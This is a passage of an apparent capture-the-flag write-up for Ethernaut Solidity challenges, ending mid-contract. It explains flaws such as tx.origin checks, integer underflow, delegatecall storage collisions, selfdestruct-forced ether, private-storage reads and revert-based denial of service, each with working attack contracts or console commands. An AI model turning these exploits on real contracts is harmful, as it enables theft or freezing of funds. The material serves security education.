</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=n>blockValue</span> <span class=o>=</span> <span class=kt>uint256</span><span class=p>(</span><span class=nb>blockhash</span><span class=p>(</span><span class=nb>block</span><span class=p>.</span><span class=nb>number</span> <span class=o>-</span>  <span class=mi>1</span> <span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=n>flip</span> <span class=o>=</span> <span class=n>blockValue</span> <span class=o>/</span> <span class=n>FACTOR</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>bool</span> <span class=n>guess</span> <span class=o>=</span> <span class=n>flip</span> <span class=o>==</span> <span class=mi>1</span> <span class=o>?</span> <span class=kc>true</span> <span class=o>:</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=n>cF</span><span class=p>.</span><span class=n>flip</span><span class=p>(</span><span class=n>guess</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>&ldquo;calculateFlip&rdquo; should be called in 10 different transactions one after other as every flip method call should be in a different block.</p><h3 id=telephone>Telephone</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Telephone</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>address</span> <span class=k>public</span> <span class=n>owner</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>constructor</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>owner</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>changeOwner</span><span class=p>(</span><span class=kt>address</span> <span class=n>_owner</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nb>tx</span><span class=p>.</span><span class=nb>origin</span> <span class=o>!=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>owner</span> <span class=o>=</span> <span class=n>_owner</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>We have to become the owner of the challenge contract. Anyone can call the changeOwner with a new owner address but to change the owner to passed &ldquo;_owner&rdquo; argument, a condition must be true which is</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nb>tx</span><span class=p>.</span><span class=nb>origin</span> <span class=o>!=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>)</span>
</span></span></code></pre></div><p>&ldquo;tx.origin&rdquo; is equal to the address created the transaction and &ldquo;msg.sender&rdquo; is equal to the address which created the message. Calling another contract is also a message call. so, when we call a different smart contract which inturn calls the challenge contract, the &ldquo;tx.origin&rdquo; will be our address whereas the &ldquo;msg.sender&rdquo; will be the address of intermediate smart contract.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>interface</span> <span class=nc>phone</span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>changeOwner</span><span class=p>(</span><span class=kt>address</span> <span class=n>owner</span><span class=p>)</span> <span class=k>external</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Attack</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>phone</span> <span class=nb>call</span> <span class=o>=</span> <span class=n>phone</span><span class=p>(</span><span class=mh>0x2346f30C90d0b3a947457A8BE69A5A835330aDda</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>attack</span><span class=p>(</span><span class=kt>address</span> <span class=n>myAddress</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>call</span><span class=p>.</span><span class=n>changeOwner</span><span class=p>(</span><span class=n>myAddress</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=token>Token</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Token</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint</span><span class=p>)</span> <span class=n>balances</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint</span> <span class=k>public</span> <span class=n>totalSupply</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>constructor</span><span class=p>(</span><span class=kt>uint</span> <span class=n>_initialSupply</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=n>totalSupply</span> <span class=o>=</span> <span class=n>_initialSupply</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>transfer</span><span class=p>(</span><span class=kt>address</span> <span class=n>_to</span><span class=p>,</span> <span class=kt>uint</span> <span class=n>_value</span><span class=p>)</span> <span class=k>public</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>-</span> <span class=n>_value</span> <span class=o>&gt;=</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>-=</span> <span class=n>_value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>balances</span><span class=p>[</span><span class=n>_to</span><span class=p>]</span> <span class=o>+=</span> <span class=n>_value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>balanceOf</span><span class=p>(</span><span class=kt>address</span> <span class=n>_owner</span><span class=p>)</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint</span> <span class=nb>balance</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>balances</span><span class=p>[</span><span class=n>_owner</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Intially, we have 20 tokens which are represented using &ldquo;balances&rdquo; map. The contract also has methods to transfer and check balance of an address. To complete this challenge we should have more tokens in our balance than the intial amount. The bug is in the &ldquo;transfer&rdquo; function, before subtracting the transfered amount from the sender&rsquo;s balance it doesn&rsquo;t check correctly whether the sender has sufficient balance or not. As a result, If we set _value parameter to some number greater than 20 (for example, 21), balances[msg.sender] - 21 = -1, which will be 2**256 - 1, since the datatype of balance is uint256. So, the require check is bypassed and our balance will become 2**256 - 1.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>await</span> <span class=nx>contract</span><span class=p>.</span><span class=nx>transfer</span><span class=p>(</span><span class=nx>instance</span><span class=p>,</span> <span class=mi>21</span><span class=p>);</span>
</span></span></code></pre></div><h3 id=delegation>Delegation</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Delegate</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>address</span> <span class=k>public</span> <span class=n>owner</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>constructor</span><span class=p>(</span><span class=kt>address</span> <span class=n>_owner</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>owner</span> <span class=o>=</span> <span class=n>_owner</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>pwn</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>owner</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Delegation</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>address</span> <span class=k>public</span> <span class=n>owner</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>Delegate</span> <span class=n>delegate</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>constructor</span><span class=p>(</span><span class=kt>address</span> <span class=n>_delegateAddress</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>delegate</span> <span class=o>=</span> <span class=n>Delegate</span><span class=p>(</span><span class=n>_delegateAddress</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>owner</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fallback</span><span class=p>()</span> <span class=k>external</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=kt>bool</span> <span class=n>result</span><span class=p>,)</span> <span class=o>=</span> <span class=kt>address</span><span class=p>(</span><span class=n>delegate</span><span class=p>).</span><span class=nb>delegatecall</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>result</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nb>this</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The fallback function has a delegate call to &ldquo;Delegate&rdquo; contract. In delegate call, the code present in the called contract is executed in the context of caller contract. The context includes storage and msg object among others. contract storage is presistent, it&rsquo;s a way to store contract state between different message calls. storage can be viewed as a large mapping from &ldquo;uint&rdquo; to bytes32. So, whenever a state variable is read or written it is done so by reading or writing to storage slot(index) assigned to that variable. Similarly, when the code modifying state variables is executed in delegate call, the storage slot of caller contract corresponding to that state variable in the called contract is modified. For example, &ldquo;pwn&rdquo; function in the &ldquo;Delegate&rdquo; contract modifies &ldquo;owner&rdquo; state variable which is stored in &ldquo;0&rdquo; storage slot. when the &ldquo;pwn&rdquo; function is executed using delegate call in &ldquo;Delegation&rdquo; contract&rsquo;s fallback function, the storage slot of &ldquo;Delegation&rdquo; contract is read and modified not the storage slot of &ldquo;Delegate&rdquo; contract. As the storage slot &ldquo;0&rdquo; of &ldquo;Delegation&rdquo; contract corresponds to it&rsquo;s &ldquo;owner&rdquo; variable, delegate call to &ldquo;pwn&rdquo; function will modify the &ldquo;Delegation&rdquo; contract&rsquo;s &ldquo;owner&rdquo; variable, which is what we need to pass this challenge.</p><p>To call &ldquo;pwn&rdquo; function, we have to compute encoded function signature of &ldquo;pwn&rdquo; function in message data. Encoded function signature is first 4 bytes of keccak256 hash of function signature. It is used to identify the function in the called contract. And to call the &ldquo;pwn&rdquo; function in delegate call, we have to pass it&rsquo;s signature in message data.
The final exploit is</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>await</span> <span class=nx>sendTransaction</span><span class=p>({</span> <span class=nx>from</span><span class=o>:</span> <span class=nx>player</span><span class=p>,</span> <span class=nx>to</span><span class=o>:</span> <span class=nx>instance</span><span class=p>,</span> <span class=nx>data</span><span class=o>:</span> <span class=s2>&#34;0xdd365b8b&#34;</span> <span class=p>});</span>
</span></span></code></pre></div><h3 id=force>Force</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Force</span> <span class=p>{</span><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>                   MEOW ?
</span></span></span><span class=line><span class=cl><span class=cm>         /\_/\   /
</span></span></span><span class=line><span class=cl><span class=cm>    ____/ o o \
</span></span></span><span class=line><span class=cl><span class=cm>  /~____  =ø= /
</span></span></span><span class=line><span class=cl><span class=cm> (______)__m_m)
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>*/</span><span class=p>}</span>
</span></span></code></pre></div><p>To complete this challenge, the challenge contract should have some amount of ether. We cannot send ether to this contract like we do for other contracts, that&rsquo;s because, a contract function should be defined as payable to receive ether. And there are no payable functions in this contract. Even though solidity compiler puts default implementations of &ldquo;receive&rdquo; and &ldquo;fallback&rdquo;, they are not payable by default. so, we cannot send ether using any kind of message call.</p><p>But there are two other ways using which we can send ether. We can send ether to the contract before the contract is deployed. The address of the deployed contract can be calculated as it only depends on the deployer address and nonce. And if we send ether to that address before the contract is deployed, there will be no code at that address and the transaction will not be reverted. The message calls containing ether are only reverted because solidity by default adds conditions for non-payable functions to check that &ldquo;msg.value&rdquo; is 0, but if the code is not yet deployed, then the transaction will not be reverted. Another way is by using selfdestruct. when a contract calls self destruct, all it&rsquo;s balance is transfered to the address given as it&rsquo;s argument and even if a smart contract presents at the given address, no function is called, as a result ether is sent to that contract.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: GPL-3.0
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Attack</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fallback</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span><span class=p>{}</span>
</span></span><span class=line><span class=cl>    <span class=n>receive</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span><span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>attack</span><span class=p>()</span> <span class=k>public</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>selfdestruct</span><span class=p>(</span><span class=k>payable</span><span class=p>(</span><span class=mh>0x6A91c42b1179226B3A80087CD84B8966d13c650f</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=vault>Vault</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Vault</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>bool</span> <span class=k>public</span> <span class=n>locked</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>bytes32</span> <span class=k>private</span> <span class=n>password</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>constructor</span><span class=p>(</span><span class=kt>bytes32</span> <span class=n>_password</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>locked</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>password</span> <span class=o>=</span> <span class=n>_password</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>unlock</span><span class=p>(</span><span class=kt>bytes32</span> <span class=n>_password</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>password</span> <span class=o>==</span> <span class=n>_password</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>locked</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>We have to set &ldquo;locked&rdquo; variable to &ldquo;false&rdquo; to complete this challenge. To unlock the contract, we can use unlock method but it requires a password. password is stored in &ldquo;password&rdquo; private variable. Even if the password is &ldquo;private&rdquo;, we can read it&rsquo;s value. The difference between &ldquo;public&rdquo; and &ldquo;private&rdquo; variable is not that &ldquo;public&rdquo; variables can be read by anyone and &ldquo;private&rdquo; variables can only be read by the contract. What it means is that, when a variable is marked &ldquo;public&rdquo; in solidity, solidity compiler creates public getter function for that variable and won&rsquo;t create for &ldquo;private&rdquo; variables. Irrespective of variable visibility, all the state variables are stored in storage of the contract. And contract storage is part of the blockchain state, which anyone can read with access to a network node. But the benefit of declaring variables &ldquo;private&rdquo; is that, they cannot be read by other smart contracts. To be exact, no contract can read other contracts storage, so, to allow reading public variables solidity creates public getter function which allow reading public variables using a message call. &ldquo;web3&rdquo; provides helper functions to read storage of an address based on the slot number. &ldquo;password&rdquo; variable is stored in storage slot 1 and using web3 we can read the password and call unlock with it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>password</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>web3</span><span class=p>.</span><span class=nx>eth</span><span class=p>.</span><span class=nx>getStorageAt</span><span class=p>(</span><span class=nx>instance</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span></code></pre></div><h3 id=king>King</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>King</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>address</span> <span class=k>payable</span> <span class=n>king</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint</span> <span class=k>public</span> <span class=n>prize</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>address</span> <span class=k>payable</span> <span class=k>public</span> <span class=n>owner</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>constructor</span><span class=p>()</span> <span class=k>public</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>owner</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>king</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>prize</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>receive</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span> <span class=o>&gt;=</span> <span class=n>prize</span> <span class=o>||</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>owner</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>king</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>king</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>prize</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>_king</span><span class=p>()</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>address</span> <span class=k>payable</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>king</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Anyone can become the king in the challenge contract if they send more ether than the present king&rsquo;s ether. To complete this challenge, we have to block anyone else from becoming the king, even if they send large amount of ether. We can do that by using the &ldquo;fallback&rdquo; function. remember that, when ether is sent with empty data or false data, one of the fallback function is called and if the fallback function &ldquo;reverts&rdquo; everytime, then it won&rsquo;t be possible to transfer ether using &ldquo;transfer&rdquo; function. The challenge contract&rsquo;s receive function transfer&rsquo;s the previous king&rsquo;s ether before updating the king to the new one. So, if the previous king&rsquo;s ether transfer fails everytime, then no one can become the king.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>interface</span> <span class=nc>king</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>receive</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>attack</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>king</span> <span class=n>k</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>()</span> <span class=k>payable</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>k</span> <span class=o>=</span> <span class=n>king</span><span class=p>(</span><span class=k>payable</span><span class=p>(</span><span class=mh>0x835DB5ACA5A72665A385ea66ca446AA7f47F2b30</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=kt>address</span><span class=p>(</span><span class=n>k</span><span class=p>).</span><span class=nb>call</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>}(</span><span class=s>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>receive</span> <span class=p>()</span> <span class=k>external</span> <span class=k>payable</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;goto back&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=re-entrancy>Re-entrancy</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Reentrance</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kn>using</span> <span class=n>SafeMath</span> <span class=k>for</span> <span class=kt>uint256</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint</span><span class=p>)</span> <span class=k>public</span> <span class=n>balances</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>donate</span><span class=p>(</span><span class=kt>address</span> <span class=n>_to</span><span class=p>)</span> <span class=k>public</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>balances</span><span class=p>[</span><span class=n>_to</span><span class=p>]</span> <span class=o>=</span> <span class=n>balances</span><span class=p>[</span><span class=n>_to</span><span class=p>].</span><span class=n>add</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>balanceOf</span><span class=p>(</span><span class=kt>address</span> <span class=n>_who</span><span class=p>)</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint</span> <span class=nb>balance</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>balances</span><span class=p>[</span><span class=n>_who</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
